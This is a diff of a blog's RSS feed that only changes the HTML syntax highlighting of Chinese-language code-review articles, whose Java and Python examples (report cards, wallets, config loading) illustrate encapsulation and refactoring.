-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;char&lt;/span&gt; grade;
-}
-
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ReportCard&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; String studentName;
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; ArrayList&amp;lt;CourseGrade&amp;gt; cliens;
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;printReport&lt;/span&gt;() {
-        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Report card for &amp;#34;&lt;/span&gt; + studentName);
-        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;------------------------&amp;#34;&lt;/span&gt;);
-        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Course Title       Grade&amp;#34;&lt;/span&gt;);
-        Iterator&amp;lt;CourseGrade&amp;gt; grades = cliens.&lt;span style=&#34;color:#658b00&#34;&gt;iterator&lt;/span&gt;();
-        CourseGrade grade;
-        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;double&lt;/span&gt; avg = 0.&lt;span style=&#34;color:#658b00&#34;&gt;0d&lt;/span&gt;;
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (grades.&lt;span style=&#34;color:#658b00&#34;&gt;hasNext&lt;/span&gt;()) {
-            grade = grades.&lt;span style=&#34;color:#658b00&#34;&gt;next&lt;/span&gt;();
-            System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(grade.&lt;span style=&#34;color:#658b00&#34;&gt;title&lt;/span&gt; + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;    &amp;#34;&lt;/span&gt; + grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt;);
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (!(grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt; == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;)) {
-                avg = avg + grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt; - 64;
-            }
-        }
-        avg = avg / cliens.&lt;span style=&#34;color:#658b00&#34;&gt;size&lt;/span&gt;();
-        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;------------------------&amp;#34;&lt;/span&gt;);
-        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Grade Point Average = &amp;#34;&lt;/span&gt; + avg);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码有哪些问题呢:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;CourseGrade&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; String title;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;char&lt;/span&gt; grade;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ReportCard&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; String studentName;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; ArrayList&amp;lt;CourseGrade&amp;gt; cliens;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;printReport&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Report card for &amp;#34;&lt;/span&gt; + studentName);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;------------------------&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Course Title       Grade&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Iterator&amp;lt;CourseGrade&amp;gt; grades = cliens.&lt;span style=&#34;color:#658b00&#34;&gt;iterator&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CourseGrade grade;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;double&lt;/span&gt; avg = 0.&lt;span style=&#34;color:#658b00&#34;&gt;0d&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (grades.&lt;span style=&#34;color:#658b00&#34;&gt;hasNext&lt;/span&gt;()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            grade = grades.&lt;span style=&#34;color:#658b00&#34;&gt;next&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(grade.&lt;span style=&#34;color:#658b00&#34;&gt;title&lt;/span&gt; + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;    &amp;#34;&lt;/span&gt; + grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (!(grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt; == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                avg = avg + grade.&lt;span style=&#34;color:#658b00&#34;&gt;grade&lt;/span&gt; - 64;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        avg = avg / cliens.&lt;span style=&#34;color:#658b00&#34;&gt;size&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;------------------------&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Grade Point Average = &amp;#34;&lt;/span&gt; + avg);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码有哪些问题呢:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;成员变量采用public，缺少数据封装性&lt;/li&gt;
 &lt;li&gt;没有判断cliens是否为空，可能除以0值。注：假定它不会为空，另外逻辑可能有问题，为什么统计总分是非F课程，除数却是所有课程Size，先忽略这个问题&lt;/li&gt;
@@ -532,41 +547,41 @@
 &lt;/ul&gt;
 &lt;p&gt;实现的主体逻辑是，收银员向顾客收钱。&lt;/p&gt;
 &lt;p&gt;代码如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Wallet&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; value;
-
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略构造方法
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;getTotalMoney&lt;/span&gt;() { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; value; }
-    
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;addMoney&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; deposit) {
-        value += deposit;
-    }
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;subtractMoney&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; debit) {
-        value -= debit;
-    }
-}
-
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Customer&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; String firstName;
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; String lastName;
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Wallet myWallet;
-
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略构造方法，与Getter
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Paperboy&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;charge&lt;/span&gt;(Customer myCustomer, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; payment) {
-        Wallet theWallet = myCustomer.&lt;span style=&#34;color:#658b00&#34;&gt;getWallet&lt;/span&gt;();
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (theWallet.&lt;span style=&#34;color:#658b00&#34;&gt;getTotalMoney&lt;/span&gt;() &amp;gt; payment) {
-            theWallet.&lt;span style=&#34;color:#658b00&#34;&gt;subtractMoney&lt;/span&gt;(payment);
-        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; NotEnoughMoneyException();
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Wallet&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; value;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略构造方法
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;getTotalMoney&lt;/span&gt;() { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; value; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;addMoney&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; deposit) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        value += deposit;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;subtractMoney&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; debit) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        value -= debit;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Customer&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; String firstName;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; String lastName;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Wallet myWallet;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略构造方法，与Getter
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Paperboy&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;charge&lt;/span&gt;(Customer myCustomer, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;float&lt;/span&gt; payment) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Wallet theWallet = myCustomer.&lt;span style=&#34;color:#658b00&#34;&gt;getWallet&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (theWallet.&lt;span style=&#34;color:#658b00&#34;&gt;getTotalMoney&lt;/span&gt;() &amp;gt; payment) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            theWallet.&lt;span style=&#34;color:#658b00&#34;&gt;subtractMoney&lt;/span&gt;(payment);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; NotEnoughMoneyException();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -578,13 +593,13 @@
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码是来自我们新构建的服务，采用Python语言开发。案例故事是这样：&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;开始：&lt;/strong&gt; 某同学最先开发某功能，需要读取服务的配置文件，代码如下，是代码直接读取文件取配置项：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;HOME_PATH = os.environ[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;HOME&amp;#39;&lt;/span&gt;]
-DASK_PROPERTIES_PATH = HOME_PATH + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/training/webapps/lodas/WEB-INF/classes/application-dask.properties&amp;#39;&lt;/span&gt;
-DASK_PROPERTIES_DICT = Properties(DASK_PROPERTIES_PATH).get_properties()
-
-CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;lodap.dask.cluster.worker.nthreads&amp;#39;&lt;/span&gt;]
-.... &lt;span style=&#34;color:#228b22&#34;&gt;# 省略其它配置项的获取代码&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;后续：&lt;/strong&gt; 功能不断增加，又分配给 &lt;em&gt;不同的同学来实现&lt;/em&gt; ，也需要读取同目录下其它的配置文件，于是又出现 &lt;em&gt;类似&lt;/em&gt; 上面的代码写法，但略有差别，就不再贴代码了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HOME_PATH = os.environ[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;HOME&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DASK_PROPERTIES_PATH = HOME_PATH + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/training/webapps/lodas/WEB-INF/classes/application-dask.properties&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DASK_PROPERTIES_DICT = Properties(DASK_PROPERTIES_PATH).get_properties()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;lodap.dask.cluster.worker.nthreads&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.... &lt;span style=&#34;color:#228b22&#34;&gt;# 省略其它配置项的获取代码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;后续：&lt;/strong&gt; 功能不断增加，又分配给 &lt;em&gt;不同的同学来实现&lt;/em&gt; ，也需要读取同目录下其它的配置文件，于是又出现 &lt;em&gt;类似&lt;/em&gt; 上面的代码写法，但略有差别，就不再贴代码了。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;问题：&lt;/strong&gt; 经过一段时间，发现类似读取配置项的代码段 &lt;em&gt;散落&lt;/em&gt; 到我们源码中多个地方。从功能上讲，代码也没什么问题；但从可维护角度来看，若后面对配置增加约束或者配置文件挪位置，侧需要修改多处。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;重构：&lt;/strong&gt; 对它的改进也很简单，对一个服务的多个配置文件集中管理，提供 &lt;em&gt;封装&lt;/em&gt; 对象。改进之后代码如下，并且做了一点小的容错性增强：&lt;/p&gt;
 &lt;ul&gt;
@@ -602,28 +617,28 @@ CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd55
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;目前写Python的同学越来越多了，但动态语言无类型约束，导致Commit时难以review。先来看一段我们的代码：&lt;/p&gt;
 &lt;p&gt;优化前的代码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;handle&lt;/span&gt;(self, data, rules):
-        rule_type = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 1&lt;/span&gt;
